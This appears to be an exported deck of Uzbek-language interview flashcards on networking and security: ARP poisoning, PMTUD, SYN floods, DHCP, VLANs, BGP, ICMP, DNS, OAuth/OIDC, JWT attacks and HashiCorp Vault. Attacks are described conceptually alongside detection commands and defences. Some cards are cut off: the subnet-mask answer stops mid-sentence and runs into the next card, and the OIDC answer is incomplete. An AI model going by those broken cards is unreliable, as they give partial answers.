yo'q.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41891	<p>ARP va ARP poisoning nima?</p>	<p><b>Qisqa javob:</b> ARP (Address Resolution Protocol) lokal L2 segmentda IP manzilni MAC manzilga tarjima qiladi: &quot;10.0.0.1 kimda?&quot; broadcast — egasi o'z MAC'i bilan javob beradi. ARP poisoning (spoofing) — hujumchi so'ralmagan soxta ARP javoblari yuborib, masalan gateway IP'sini o'z MAC'iga bog'laydi va trafikni o'zi orqali o'tkazadi (MITM).</p><p><b>Nega mumkin:</b> ARP'da autentifikatsiya yo'q — qurilmalar har qanday ARP javobiga (hatto so'ralmagan, &quot;gratuitous&quot;) ishonadi va cache'ni yangilaydi.</p><pre>Normal:<br>Victim: &quot;10.0.0.1 (gateway) MAC?&quot;  -&gt; Gateway: &quot;aa:aa:..&quot;<br>Victim ARP cache: 10.0.0.1 -&gt; aa:aa:..<br><br>Poisoning:<br>Attacker -&gt; Victim : &quot;10.0.0.1 is-at ee:ee:..&quot; (soxta, takror-takror)<br>Attacker -&gt; Gateway: &quot;10.0.0.50 is-at ee:ee:..&quot;<br>Victim -&gt; [Attacker ee:ee] -&gt; Gateway     &lt;- trafikni o'qiydi/o'zgartiradi</pre><p><b>Amalda (aniqlash):</b></p><pre>ip neigh show                         # IP -&gt; MAC jadvali<br>arp -n | sort -k3 | uniq -f2 -D       # bir MAC bir nechta IP'da -&gt; shubhali<br>sudo tcpdump -ni eth0 arp<br>sudo arpwatch -i eth0                 # MAC o'zgarishlarini log qiladi</pre><p><b>Himoya:</b></p><ul><li>Switch'da Dynamic ARP Inspection (DHCP snooping jadvali bilan solishtiradi).</li><li>Kritik hostlar uchun statik ARP yozuvi (<code>ip neigh add 10.0.0.1 lladdr aa:aa:.. dev eth0 nud permanent</code>).</li><li>Asosiy himoya — shifrlash (TLS, mTLS, SSH): MITM bo'lsa ham trafikni o'qib/o'zgartirib bo'lmaydi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Cloud VPC'da ARP spoofing odatda ishlamaydi (hypervisor SDN o'zi javob beradi) — lekin on-prem va bitta node ichidagi container bridge'ida mumkin.</li><li>Gratuitous ARP failover (keepalived VIP) uchun legitim — bloklasang HA ishlamaydi.</li><li>IPv6'da ARP yo'q, NDP bor — u ham spoofing'ga moyil (RA Guard kerak).</li></ul><p><b>Senior nuqta:</b> Kubernetes'da <code>CAP_NET_RAW</code> (default'da container'larda bor) ARP/raw paket yuborishga imkon beradi — <code>drop: [&quot;ALL&quot;]</code> bilan olib tashla. L2 hujumlariga eng yaxshi javob — L2'ga ishonmaslik va hamma joyda shifrlash.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41892	<p>MTU va Path MTU Discovery (PMTUD) nima?</p>	<p><b>Qisqa javob:</b> MTU (Maximum Transmission Unit) — bitta L2 frame ichida uzatiladigan eng katta IP paket hajmi (Ethernet 1500 bayt, jumbo frame 9001 AWS VPC ichida). PMTUD (Path MTU Discovery) — yo'l bo'yidagi eng kichik MTU'ni aniqlash: paket DF (Don't Fragment) bilan yuboriladi, sig'maydigan router ICMP &quot;Fragmentation Needed&quot; (IPv6'da &quot;Packet Too Big&quot;) qaytaradi, jo'natuvchi hajmni kamaytiradi.</p><p><b>Muammo:</b> Tunnel/overlay (VXLAN, IPsec, WireGuard) har paketga header qo'shadi (VXLAN +50 bayt). Agar ICMP bloklangan bo'lsa, PMTUD ishlamaydi — &quot;black hole&quot;: TCP handshake va kichik so'rovlar o'tadi, katta javoblar (TLS sertifikat, katta JSON) osilib qoladi.</p><pre>Pod (MTU 1500) -&gt; VXLAN (+50) -&gt; 1550 &gt; node MTU 1500<br>   DF=1 -&gt; router tashlaydi -&gt; ICMP &quot;Frag Needed, MTU 1450&quot;<br>   ICMP firewall'da bloklangan -&gt; jo'natuvchi bilmaydi -&gt; qayta yuboradi -&gt; timeout<br>Belgisi: ping ishlaydi, curl kichik sahifa ishlaydi, katta fayl / TLS handshake osiladi</pre><p><b>Amalda:</b></p><pre>ip link show eth0 | grep mtu<br>ping -M do -s 1472 10.0.2.10     # 1472 + 28 (IP+ICMP header) = 1500; o'tmasa MTU kichik<br>ping -M do -s 1422 10.0.2.10     # bisect bilan haqiqiy path MTU'ni top<br>tracepath 10.0.2.10              # pmtu ni ko'rsatadi<br>sudo ip link set dev eth0 mtu 1450</pre><p>TCP uchun yechim — MSS clamping:</p><pre>iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu</pre><p><b>Tuzoqlar:</b></p><ul><li>&quot;Xavfsizlik uchun&quot; ICMP'ni butunlay bloklash — PMTUD buziladi; kamida type 3 code 4 (IPv4) va ICMPv6 type 2 ga ruxsat.</li><li>CNI MTU'sini node MTU'dan overhead'ni ayirmasdan sozlash.</li><li>VPC peering yoki VPN orqali jumbo frame (9001) — o'tmaydi, chegarada 1500 (yoki undan kam).</li></ul><p><b>Senior nuqta:</b> &quot;Ba'zi so'rovlar osilib qoladi, ba'zilari yo'q&quot; va &quot;faqat VPN orqali&quot; simptomlari — birinchi gumon MTU. Zamonaviy Linux'da PLPMTUD (<code>net.ipv4.tcp_mtu_probing=1</code>) ICMP'ga tayanmasdan MTU'ni sinab topadi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41893	<p>TCP SYN flood va SYN cookies nima?</p>	<p><b>Qisqa javob:</b> SYN flood — hujumchi ko'p (ko'pincha soxta IP'li) <code>SYN</code> yuboradi, server har biriga <code>SYN-ACK</code> qaytarib half-open ulanishni SYN queue'da saqlaydi, yakuniy <code>ACK</code> hech qachon kelmaydi — queue to'ladi va legitim client'lar ulana olmaydi. SYN cookies — queue to'lganda server holatni saqlamaydi, uni <code>SYN-ACK</code> ning sequence raqamiga kriptografik kodlaydi; faqat haqiqiy <code>ACK</code> kelganda ulanish tiklanadi.</p><pre>Normal:   C --SYN--&gt; S [SYN queue'ga yozuv] --SYN-ACK--&gt; C --ACK--&gt; S [accept queue]<br><br>SYN flood:<br>soxta IP'lar --SYN x 100k--&gt; S: SYN queue to'ldi -&gt; yangi SYN tashlanadi<br><br>SYN cookies:<br>S: ISN = hash(src/dst ip:port, vaqt, secret) + MSS kodi   &lt;- xotira ajratilmaydi<br>C --ACK(ISN+1)--&gt; S: hash'ni qayta hisoblab tekshiradi -&gt; mos -&gt; ulanish yaratiladi<br>Soxta IP'lar ACK yubormaydi -&gt; resurs sarflanmaydi</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_syncookies          # 1 = queue to'lganda yoqiladi (default)<br>sysctl -w net.ipv4.tcp_max_syn_backlog=4096<br>sysctl -w net.ipv4.tcp_synack_retries=2<br>ss -tan state syn-recv | wc -l          # half-open ulanishlar soni<br>nstat -az | grep -i syncookies          # TcpExtSyncookiesSent / Recv / Failed<br>dmesg | grep -i &quot;SYN flooding&quot;          # &quot;Possible SYN flooding on port 443. Sending cookies.&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li>SYN cookies bilan ba'zi TCP opsiyalari (window scaling, SACK) cheklangan bo'lishi mumkin — shuning uchun faqat queue to'lganda yoqiladi (<code>=1</code>), <code>=2</code> doimiy.</li><li>Accept queue (listen backlog, <code>somaxconn</code>) to'lishi boshqa muammo — bu sekin ilova belgisi, SYN flood emas.</li><li>Bitta server darajasida himoya volumetrik hujumga yetmaydi — tarmoq kanali baribir to'ladi.</li></ul><p><b>Senior nuqta:</b> Cloud'da SYN flood'ni odatda edge yutadi (AWS Shield Standard, NLB, Cloudflare). O'z serverlaringda: syncookies yoqiq, backlog'lar mos, va <code>SyncookiesSent</code> metrikasiga alert — bu hujumning erta signali.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41894	<p>DHCP nima?</p>	<p><b>Qisqa javob:</b> DHCP (Dynamic Host Configuration Protocol) — tarmoqqa ulangan qurilmaga IP manzil, subnet mask, default gateway, DNS server va boshqa parametrlarni avtomatik, vaqtinchalik (lease) beradigan protokol. Jarayon DORA: Discover, Offer, Request, Ack.</p><p><b>Nega kerak:</b> 500 ta laptop, VM yoki konteyner node'iga IP'ni qo'lda yozish — xato va to'qnashuv manbai. DHCP manzillarni markaziy pool'dan beradi va qaytarib oladi.</p><pre>Client (IP yo'q, 0.0.0.0:68)             DHCP server (:67)<br>  | -- DISCOVER (broadcast) ---------------&gt; |<br>  | &lt;------------------- OFFER (10.0.0.42) - |<br>  | -- REQUEST (10.0.0.42 ni olaman) ------&gt; |   (broadcast — boshqa serverlar ham bilsin)<br>  | &lt;------------------- ACK (lease 24h,     |<br>  |      gw 10.0.0.1, dns 10.0.0.2)          |<br>Lease'ning 50% ida (T1) client renew qiladi</pre><p>Boshqa subnet'dagi server uchun router'da DHCP relay (<code>ip helper-address</code>) kerak — broadcast router'dan o'tmaydi.</p><p><b>Amalda:</b></p><pre>ip addr show eth0            # &quot;dynamic&quot; va valid_lft -&gt; DHCP'dan olingan<br>sudo dhclient -v -r eth0 &amp;&amp; sudo dhclient -v eth0    # lease'ni bo'shatib qayta olish<br>journalctl -u systemd-networkd | grep -i dhcp<br>nmcli device show eth0 | grep -E 'IP4|DHCP'</pre><p>AWS'da: VPC DHCP options set — instance'lar DNS server va domen nomini shu orqali oladi.</p><p><b>Tuzoqlar:</b></p><ul><li>Rogue DHCP server (kimdir o'z router'ini ulaydi) — noto'g'ri gateway/DNS bilan MITM; switch'da DHCP snooping.</li><li>Server'lar uchun dinamik IP — o'zgarsa monitoring/firewall buziladi; reservation (MAC bo'yicha) yoki statik.</li><li>Pool tugashi (IP exhaustion) — yangi qurilmalar <code>169.254.x.x</code> (APIPA) oladi.</li></ul><p><b>Senior nuqta:</b> Cloud'da DHCP'ni o'zing ishlatmaysan, lekin uning ta'siri bor: VPC DHCP options set'ni o'zgartirish (masalan custom DNS) barcha instance'lar resolver'ini o'zgartiradi — hybrid DNS'da ehtiyotkorlik bilan.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41895	<p>VLAN nima?</p>	<p><b>Qisqa javob:</b> VLAN (Virtual LAN, IEEE 802.1Q) — bitta fizik switch infratuzilmasini bir nechta mantiqiy, izolyatsiyalangan L2 broadcast domenga bo'lish. Har frame'ga 4 baytli tag (VLAN ID, 1-4094) qo'shiladi; turli VLAN'lar orasida trafik faqat router/L3 switch orqali (firewall qoidalari bilan) o'tadi.</p><p><b>Nega kerak:</b> Buxgalteriya, mehmon Wi-Fi, serverlar va kameralar bitta switch'da — VLAN'siz ular bir broadcast domenda, bir-birini ko'radi. VLAN bilan segmentatsiya: xavfsizlik, broadcast trafikini kamaytirish, kabelni o'zgartirmasdan tarmoqni qayta tuzish.</p><pre>             [L3 switch / router + ACL]<br>                 |  trunk (802.1Q, tag'li: 10,20,30)<br>            [Switch]<br>   access VLAN10 | access VLAN20 | access VLAN30<br>     [Dev PC]       [Server]        [Guest]<br>VLAN10 &lt;-&gt; VLAN20 : faqat router orqali, qoidaga ko'ra</pre><ul><li>Access port: bitta VLAN, tag'siz (oxirgi qurilma uchun).</li><li>Trunk port: ko'p VLAN, tag'li (switch-switch, switch-hypervisor).</li></ul><p><b>Amalda (Linux):</b></p><pre>sudo ip link add link eth0 name eth0.20 type vlan id 20<br>sudo ip addr add 10.20.0.5/24 dev eth0.20<br>sudo ip link set eth0.20 up<br>cat /proc/net/vlan/config<br>sudo tcpdump -eni eth0 vlan          # tag'li frame'larni ko'rish</pre><p><b>Tuzoqlar:</b></p><ul><li>Native VLAN'ni default (1) qoldirish — VLAN hopping (double tagging) hujumi; native VLAN'ni ishlatilmaydigan ID'ga o'zgartir.</li><li>VLAN = xavfsizlik deb o'ylash — VLAN'lar orasida ACL/firewall bo'lmasa routing hammasini ochib qo'yadi.</li><li>4094 ID limiti — katta multi-tenant data center'da yetmaydi.</li></ul><p><b>Senior nuqta:</b> Cloud va Kubernetes'da VLAN o'rnini VPC/subnet va overlay (VXLAN — 16 mln ID, Geneve) egallagan. On-prem K8s'da Multus + VLAN interfeyslari telecom/storage tarmoqlari uchun hali ham keng ishlatiladi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41896	<p>BGP (Border Gateway Protocol) nima?</p>	<p><b>Qisqa javob:</b> BGP (Border Gateway Protocol, v4) — internetning routing protokoli: avtonom tizimlar (AS — har biri o'z raqamiga ega provider, cloud, kompaniya) bir-biriga &quot;bu IP prefikslariga men orqali yetasan&quot; deb e'lon qiladi. Path-vector protokol: har marshrut AS yo'li bilan keladi, tanlov siyosat (local pref, AS path uzunligi va h.k.) asosida.</p><p><b>Nega bilish kerak:</b> BGP xatosi butun kompaniyani internetdan &quot;yo'q qiladi&quot; (Facebook 2021: o'z prefikslarini e'lon qilishni to'xtatdi, 6 soat avariya). Hybrid cloud (Direct Connect, VPN), Kubernetes bare-metal LB (MetalLB, Calico) ham BGP ishlatadi.</p><pre>AS64500 (sen) --announce 203.0.113.0/24--&gt; AS174 (ISP) --&gt; AS3356 --&gt; ... butun internet<br>                                                  AS path: 3356 174 64500<br>eBGP: AS'lar orasida (TCP 179)<br>iBGP: bitta AS ichida<br>Hijack: AS666 ham &quot;203.0.113.0/24&quot; (yoki aniqroq /25) e'lon qiladi -&gt; trafik unga ketadi</pre><p><b>Amalda:</b></p><pre>whois -h whois.radb.net 8.8.8.8            # prefiks va origin AS<br>curl -s https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS15169 | jq '.data.prefixes[:3]'<br># AWS Direct Connect: BGP session holati<br>aws directconnect describe-virtual-interfaces --query 'virtualInterfaces[].bgpPeers[].bgpStatus'<br># Calico/MetalLB:<br>calicoctl node status</pre><p><b>Tuzoqlar:</b></p><ul><li>Route leak/hijack — RPKI (ROA yozuvlari) bilan origin validatsiya qilinmagan.</li><li>Direct Connect + VPN backup'da noto'g'ri AS path prepend/local pref — trafik kutilmagan yo'ldan ketadi.</li><li>BGP session'ni (TCP 179) firewall bloklaydi yoki MD5/TTL security yo'q.</li></ul><p><b>Senior nuqta:</b> BGP — ishonchga asoslangan protokol, xavfsizlik keyinroq qo'shilgan (RPKI, ASPA). O'z prefiksingni monitoring qil (BGPalerts, Cloudflare Radar) — hijack daqiqalarda sodir bo'ladi va tashqaridan ko'rinadi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41897	<p>ICMP nima?</p>	<p><b>Qisqa javob:</b> ICMP (Internet Control Message Protocol) — IP qatlamining &quot;xizmat xabarlari&quot; protokoli: xatolar (manzil yetib bo'lmaydi, TTL tugadi, paket juda katta) va diagnostika (echo). <code>ping</code> — Echo Request/Reply, <code>traceroute</code> — TTL tugashi (Time Exceeded) xabarlariga tayanadi.</p><p><b>Nega muhim:</b> ICMP shunchaki &quot;ping&quot; emas — PMTUD (Fragmentation Needed) va IPv6'da NDP (manzil aniqlash) unga tayanadi. Butunlay bloklash tarmoqni sirli tarzda buzadi.</p><p>| Type | Nomi | Ishlatilishi | |---|---|---| | 0 / 8 | Echo Reply / Request | <code>ping</code> | | 3 | Destination Unreachable (code 4 = Frag Needed) | port yopiq, PMTUD | | 11 | Time Exceeded | <code>traceroute</code> | | 5 | Redirect | odatda o'chirilishi kerak |</p><pre>traceroute: TTL=1 -&gt; router1 &quot;Time Exceeded&quot; -&gt; TTL=2 -&gt; router2 ... -&gt; manzil</pre><p><b>Amalda:</b></p><pre>ping -c 4 10.0.1.5                  # loss %, rtt min/avg/max<br>mtr -rwc 50 api.example.com         # har hop bo'yicha loss va latency<br>traceroute -T -p 443 api.example.com   # TCP SYN bilan (ICMP bloklangan joyda)<br>sudo tcpdump -ni eth0 icmp</pre><p>AWS Security Group'da ping uchun: ICMP Echo Request ruxsati; PMTUD uchun &quot;Destination Unreachable — fragmentation needed&quot;.</p><p><b>Tuzoqlar:</b></p><ul><li><code>ping</code> javob bermasa &quot;server o'chiq&quot; xulosasi — ko'p cloud/firewall ICMP'ni bloklaydi; <code>nc -zv</code> yoki <code>curl</code> bilan tekshir.</li><li><code>mtr</code>'da oraliq hop'da 100% loss, oxirgisida 0% — bu router ICMP'ga rate limit qo'ygan, muammo emas.</li><li>ICMPv6'ni bloklash — IPv6 umuman ishlamaydi (NDP, RA).</li></ul><p><b>Senior nuqta:</b> To'g'ri siyosat — ICMP'ni ko'r-ko'rona bloklash emas, kerakli turlarga ruxsat va rate limit. ICMP tunneling/exfiltration xavfi real, lekin uni egress monitoring bilan yop, PMTUD'ni buzish bilan emas.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41898	<p>Subnet mask va default gateway nima?</p>	<p><b>Qisqa javob:</b> Subnet mask IP manzilning qaysi bitlari tarmoqni, qaysilari hostni bildirishini ko'rsatadi (<code>255.255.255.0</code> = <code>/24</code>). Default gateway — manzil o'z subnet'imda bo'lmasa paketni yuboradigan router IP'si.</p><p><b>Qanday qaror qabul qilinadi:</b> Host har paket uchun: &quot;manzil va mening IP'm mask bo'yicha bir tarmoqdami?&quot; Ha — to'g'ridan ARP orqali MAC topib yuboradi. Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41899	<p>DNS <code>A</code>, <code>AAAA</code>, <code>CNAME</code> va <code>ALIAS</code> yozuvlari farqi.</p>	<p><b>Qisqa javob:</b> <code>A</code> — nom -&gt; IPv4. <code>AAAA</code> — nom -&gt; IPv6. <code>CNAME</code> — nom -&gt; boshqa nom (alias; resolver keyin o'sha nomni hal qiladi). <code>ALIAS</code> (Route 53 Alias, Cloudflare CNAME flattening, boshqalarda <code>ANAME</code>) — provider darajasidagi yozuv: tashqaridan <code>A</code>/<code>AAAA</code> bo'lib ko'rinadi, lekin ichida AWS resursiga (ALB, CloudFront, S3) bog'langan va zona apex'ida ishlaydi.</p><p><b>Muammo:</b> <code>example.com</code> (apex) ni ALB'ga yo'naltirmoqchisan. ALB IP'lari o'zgaradi, shuning uchun <code>A</code> yozib bo'lmaydi. <code>CNAME</code> esa apex'da RFC bo'yicha taqiqlangan (apex'da SOA va NS bor, CNAME boshqa yozuvlar bilan birga turolmaydi). Yechim — <code>ALIAS</code>.</p><pre>www.example.com  CNAME  my-alb-123.us-east-1.elb.amazonaws.com<br>                         -&gt; A 3.5.6.7, 3.5.6.8 (o'zgarib turadi)<br>example.com      ALIAS  -&gt; Route 53 o'zi ALB IP'larini topib A sifatida qaytaradi<br>api.example.com  A      203.0.113.10<br>api.example.com  AAAA   2001:db8::10</pre><p>| | A/AAAA | CNAME | ALIAS | |---|---|---|---| | Qiymat | IP | hostname | AWS resurs / hostname | | Apex'da | ha | yo'q | ha | | Qo'shimcha so'rov | yo'q | bor | yo'q (server tomonda) | | Route 53 narxi | so'rov uchun | so'rov uchun | AWS resursga so'rov bepul |</p><p><b>Amalda:</b></p><pre>dig +short www.example.com CNAME<br>dig +short example.com A<br>dig example.com AAAA +noall +answer</pre><p><b>Tuzoqlar:</b></p><ul><li>Apex'ga CNAME qo'yish — ko'p provider rad etadi, qo'yganlar MX/TXT'ni buzadi.</li><li>CNAME zanjiri uzun (3-4 bo'g'in) — har biri qo'shimcha so'rov va TTL murakkabligi.</li><li>IPv6 yoqilgan, lekin <code>AAAA</code> noto'g'ri manzilga — dual-stack client'lar sekin ishlaydi yoki uziladi.</li></ul><p><b>Senior nuqta:</b> ALIAS standart DNS turi emas — provider'ga bog'lanish (lock-in). Multi-provider DNS'da apex'ni boshqarish strategiyasini oldindan hal qil. Yangi standart <code>HTTPS</code>/<code>SVCB</code> yozuvlari apex alias va HTTP/3 haqida ma'lumotni ham bera oladi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41900	<p>DNS TTL nima?</p>	<p><b>Qisqa javob:</b> TTL (Time To Live) — DNS yozuvini resolver va client'lar authoritative serverga qayta murojaat qilmasdan necha soniya cache'da saqlashi mumkinligi. Katta TTL — tez va kam so'rov, lekin o'zgarish sekin tarqaladi; kichik TTL — tez o'zgarish, lekin ko'proq so'rov va DNS'ga bog'liqlik.</p><p><b>Real vaziyat:</b> Serverni yangi IP'ga ko'chirding, <code>A</code> yozuvini o'zgartirding, lekin TTL 86400 (1 kun) edi. Foydalanuvchilarning bir qismi 24 soatgacha eski IP'ga boradi.</p><pre>Migratsiya rejasi:<br>T-48h : TTL 86400 -&gt; 60    (eski katta TTL tugashini kut)<br>T-0   : A yozuvi -&gt; yangi IP; 1-2 daqiqada hamma yangiga o'tadi<br>        eski server hali ishlab tursin (kechikkan cache'lar uchun)<br>T+24h : hammasi barqaror -&gt; TTL'ni 3600 ga qaytar, eski serverni o'chir</pre><p><b>Amalda:</b></p><pre>dig example.com A +noall +answer<br># example.com.   247   IN  A  203.0.113.10    &lt;- 247 = shu resolver cache'ida qolgan soniya<br>dig @ns1.provider.com example.com A +noall +answer   # authoritative'dagi asl TTL</pre><p>Tipik qiymatlar: tez-tez o'zgaruvchi/failover 60, oddiy servis 300-3600, NS/MX 86400. SOA'dagi negative TTL &quot;NXDOMAIN&quot; javobini qancha cache'lashni belgilaydi.</p><p><b>Tuzoqlar:</b></p><ul><li>TTL'ni o'zgarish bilan bir vaqtda kamaytirish — eski katta TTL baribir amal qiladi; oldindan kamaytir.</li><li>Ba'zi client'lar TTL'ni hurmat qilmaydi (eski JVM <code>networkaddress.cache.ttl</code>, ba'zi ISP resolver'lari minimal TTL qo'yadi).</li><li>Yozuv yaratilishidan oldin so'ralsa, NXDOMAIN negative cache'ga tushadi — yangi subdomen &quot;ishlamayapti&quot;.</li></ul><p><b>Senior nuqta:</b> DNS-asosidagi failover (Route 53 health check) uchun TTL 60 yoki kamroq, lekin baribir 1-5 daqiqalik &quot;dumi&quot; bo'ladi. Tezroq failover kerak bo'lsa — Anycast IP yoki load balancer darajasida, DNS'da emas.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41901	<p>OIDC va OAuth 2.0 (xavfsizlik kontekstida) farqi.</p>	<p><b>Qisqa javob:</b> OAuth 2.0 — <b>avtorizatsiya</b> framework'i: ilova foydalanuvchi nomidan resursga (API) kirish uchun access token oladi; u &quot;kim&quot; ekanini standart tarzda aytmaydi. OIDC (OpenID Connect) — OAuth 2.0 ustidagi <b>autentifikatsiya</b> qatlami: qo'shimcha ID token (imzolangan JWT) beradi, unda foydalanuvchi kimligi (<code>sub</code>, <code>email</code>, <code>iss</code>, <code>aud</code>) bor.</p><p><b>Analogiya:</b> OAuth — mehmonxona kalit kartasi (qaysi xonalarga kira olasan). Workload'lar uchun ham xuddi shu model: OIDC federation bilan statik secret'larni yo'q qil.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals

Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41903	<p>JWT tuzilishi (xavfsizlik kontekstida) qanday?</p>	<p><b>Qisqa javob:</b> JWT — nuqta bilan ajratilgan uch Base64URL qism: <code>header.payload.signature</code>. Header — algoritm (<code>alg</code>) va kalit ID (<code>kid</code>); payload — claim'lar (<code>sub</code>, <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>iat</code>, ...); signature — header va payload'ning imzosi (HMAC, RSA yoki ECDSA). JWT <b>shifrlanmagan</b>, faqat imzolangan — har kim payload'ni o'qiy oladi.</p><pre>eyJhbGciOiJSUzI1NiIsImtpZCI6ImsxIn0 . eyJzdWIiOiI0MiIsImV4cCI6...} . SflKxwRJ...<br>{&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;k1&quot;}            {&quot;sub&quot;:&quot;42&quot;,&quot;iss&quot;:&quot;https://idp&quot;,     RSA imzo<br>                                       &quot;aud&quot;:&quot;api&quot;,&quot;exp&quot;:1767225600}<br>Tekshirish:<br>1. alg ni server o'zi belgilaydi (token'dagiga ishonmaydi)<br>2. kid bo'yicha JWKS'dan public key -&gt; imzo<br>3. exp / nbf (clock skew +-60s), iss, aud<br>4. keyin claim'lar asosida avtorizatsiya</pre><p><b>Amalda:</b></p><pre>echo &quot;$TOKEN&quot; | cut -d. -f2 | tr '_-' '/+' | base64 -d 2&gt;/dev/null | jq   # payload'ni ko'rish<br>curl -s https://idp.example.com/.well-known/jwks.json | jq '.keys[].kid'</pre><pre>token, err := jwt.Parse(raw, keyFunc,<br>    jwt.WithValidMethods([]string{&quot;RS256&quot;}),<br>    jwt.WithIssuer(&quot;https://idp.example.com&quot;),<br>    jwt.WithAudience(&quot;api&quot;),<br>    jwt.WithExpirationRequired())</pre><p><b>Ma'lum hujumlar:</b></p><ul><li><code>alg: none</code> — imzosiz token qabul qilinadi.</li><li>Algorithm confusion — RS256 public kalitini HS256 secret sifatida ishlatib soxta token.</li><li><code>kid</code>/<code>jku</code> orqali hujumchi o'z kalitini ko'rsatadi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Payload'ga maxfiy ma'lumot (parol, PII) yozish.</li><li>Uzoq muddatli access token — revoke qilib bo'lmaydi; access 5-15 daqiqa, refresh token rotation bilan.</li><li>JWT'ni brauzerda <code>localStorage</code> da saqlash — XSS bilan o'g'irlanadi; <code>HttpOnly</code> cookie afzal.</li></ul><p><b>Senior nuqta:</b> JWT'ning kuchi — stateless tekshiruv, zaifligi — bekor qilish qiyin. Logout/ban kerak bo'lsa qisqa TTL + denylist (<code>jti</code>) yoki opaque token + introspection. Signing kalitlarini JWKS orqali rotatsiya qil.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41904	<p>Vault Transit secrets engine nima?</p>	<p><b>Qisqa javob:</b> Vault Transit — &quot;encryption as a service&quot;: ilova ma'lumotni Vault API'ga yuborib shifrlatadi/ochtiradi, shifrlash kaliti esa hech qachon Vault'dan chiqmaydi. Ma'lumot Vault'da saqlanmaydi — ciphertext ilovaga qaytadi va u o'z DB'sida saqlaydi.</p><p><b>Muammo:</b> Ilova DB'da karta raqami yoki pasport ma'lumotini shifrlashi kerak. Kalitni ilova config'ida saqlash — server buzilsa kalit ham, ma'lumot ham ketadi; rotatsiya esa butun DB'ni qayta shifrlashni talab qiladi.</p><pre>App --plaintext(base64)--&gt; Vault transit/encrypt/orders<br>    &lt;-- &quot;vault:v1:8SDd3WHDOjf7mq69...&quot;   (v1 = kalit versiyasi)<br>DB: ciphertext saqlanadi<br><br>Kalit rotatsiyasi: transit/keys/orders/rotate -&gt; v2<br>  yangi shifrlash v2 bilan, eski v1 ciphertext hali ochiladi<br>  transit/rewrap -&gt; v1 ni v2 ga plaintext'ni ko'rsatmasdan o'tkazadi<br>min_decryption_version=2 -&gt; v1 endi ochilmaydi</pre><p><b>Amalda:</b></p><pre>vault secrets enable transit<br>vault write -f transit/keys/orders type=aes256-gcm96<br>vault write transit/encrypt/orders plaintext=$(echo -n &quot;4111-1111&quot; | base64)<br>vault write transit/decrypt/orders ciphertext=&quot;vault:v1:8SDd...&quot; -format=json | jq -r .data.plaintext | base64 -d<br>vault write -f transit/keys/orders/rotate<br>vault write transit/rewrap/orders ciphertext=&quot;vault:v1:8SDd...&quot;</pre><p>Boshqa imkoniyatlar: imzo/verify, HMAC, datakey (envelope encryption uchun), convergent encryption (qidiruv uchun deterministik).</p><p><b>Tuzoqlar:</b></p><ul><li>Har qatorni alohida HTTP chaqiruv bilan shifrlash — latency; <code>batch_input</code> yoki datakey + lokal shifrlash.</li><li>Policy'da <code>encrypt</code> va <code>decrypt</code> ni bir xil servisga berish shart emas — masalan, faqat yozuvchi servis encrypt qilsin.</li><li>Vault mavjud bo'lmasa ilova ma'lumot o'qiy olmaydi — HA va timeout/retry siyosati kerak.</li></ul><p><b>Senior nuqta:</b> Transit ilovani kriptografiya va kalit boshqaruvidan ozod qiladi va har decrypt'ni audit qiladi. Cloud'da muqobil — KMS + envelope encryption; tanlov Vault allaqachon platformada bormi va multi-cloud talabiga bog'liq.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41905	<p>Vault PKI secrets engine nima?</p>	<p><b>Qisqa javob:</b> Vault PKI secrets engine Vault'ni ichki CA'ga aylantiradi: so'rov bo'yicha bir necha soniyada qisqa muddatli (soatlar-kunlar) X.509 sertifikat chiqaradi, role'lar orqali qaysi domenlar va qancha muddat ruxsat etilishini cheklaydi. Ichki mTLS va servis sertifikatlarini qo'lda boshqarish yo'qoladi.</p><p><b>Muammo:</b> Ichki servislar uchun 2 yillik sertifikatlarni <code>openssl</code> bilan qo'lda yaratish, Excel'da muddatlarni kuzatish va bir kuni hammasi tugab avariya.</p><pre>Root CA (oflayn yoki pki/ mount, uzoq muddat)<br>  v imzolaydi<br>Intermediate CA (pki_int/, Vault ichida)<br>  v role &quot;svc&quot;: allowed_domains=svc.internal, max_ttl=72h<br>Servis -&gt; vault write pki_int/issue/svc common_name=api.svc.internal ttl=24h<br>      &lt;- certificate + private_key + ca_chain (kalit faqat javobda, Vault saqlamaydi)<br>TTL tugashidan oldin qayta so'raydi (Vault Agent / cert-manager avtomatik)</pre><p><b>Amalda:</b></p><pre>vault secrets enable -path=pki_int pki<br>vault secrets tune -max-lease-ttl=43800h pki_int<br>vault write pki_int/roles/svc allowed_domains=svc.internal allow_subdomains=true max_ttl=72h<br>vault write pki_int/issue/svc common_name=api.svc.internal 